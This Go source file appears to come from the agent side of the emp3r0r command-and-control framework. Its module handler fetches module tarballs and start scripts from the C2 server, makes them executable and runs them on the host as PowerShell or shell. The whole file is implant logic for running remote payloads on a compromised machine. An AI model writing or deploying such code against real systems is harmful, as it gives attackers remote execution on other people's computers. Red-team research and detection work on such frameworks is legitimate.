package agent

import (
	"fmt"
	"log"
	"os"
	"path/filepath"
	"runtime"

	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// moduleHandler downloads and runs modules from C2
func moduleHandler(modName, checksum string, inMem bool) (out string) {
	tarball := filepath.Join(RuntimeConfig.AgentRoot, modName+".tar.xz")
	modDir := filepath.Join(RuntimeConfig.AgentRoot, modName)
	startScript := fmt.Sprintf("%s.%s", modName, getScriptExtension())

	var err error

	// cd to module dir
	defer os.Chdir(RuntimeConfig.AgentRoot)
	os.Chdir(modDir)

	if !inMem {
		if downloadErr := downloadAndVerifyModule(tarball, checksum); downloadErr != nil {
			return downloadErr.Error()
		}

		if extractErr := extractAndRunModule(modDir, tarball); extractErr != nil {
			return extractErr.Error()
		}
	}

	out, err = runStartScript(startScript, modDir)
	if err != nil {
		return fmt.Sprintf("running start script: %v: %s", err, out)
	}
	return out
}

func getScriptExtension() string {
	if runtime.GOOS == "windows" {
		return "ps1"
	}
	return "sh"
}

func downloadAndVerifyModule(tarball, checksum string) error {
	if tun.SHA256SumFile(tarball) != checksum {
		if _, err := DownloadViaCC(tarball, tarball); err != nil {
			return err
		}
	}

	if tun.SHA256SumFile(tarball) != checksum {
		log.Print("Checksum failed, restarting...")
		os.RemoveAll(tarball)
		return downloadAndVerifyModule(tarball, checksum) // Recursive call
	}
	return nil
}

func extractAndRunModule(modDir, tarball string) error {
	os.RemoveAll(modDir)
	if err := util.Unarchive(tarball, RuntimeConfig.AgentRoot); err != nil {
		return fmt.Errorf("unarchive module tarball: %v", err)
	}

	return processModuleFiles(modDir)
}

func processModuleFiles(modDir string) error {
	files, err := os.ReadDir(modDir)
	if err != nil {
		return fmt.Errorf("processing module files: %v", err)
	}

	for _, f := range files {
		if err := os.Chmod(filepath.Join(modDir, f.Name()), 0o700); err != nil {
			return fmt.Errorf("setting permissions for %s: %v", f.Name(), err)
		}

		libsTarball := filepath.Join(modDir, "libs.tar.xz")
		if util.IsExist(libsTarball) {
			os.RemoveAll(filepath.Join(modDir, "libs"))
			if err := util.Unarchive(libsTarball, modDir); err != nil {
				return fmt.Errorf("unarchive %s: %v", libsTarball, err)
			}
		}
	}
	return nil
}

func runStartScript(startScript, modDir string) (string, error) {
	// cd to module dir
	defer os.Chdir(RuntimeConfig.AgentRoot)
	os.Chdir(modDir)

	// Download the script payload
	payload, err := DownloadViaCC(startScript, "")
	if err != nil {
		return "", fmt.Errorf("downloading %s: %w", startScript, err)
	}
	scriptData := payload

	log.Printf("Running %s:\n%s...", startScript, scriptData[:100])
	return RunModuleScript(scriptData)
}
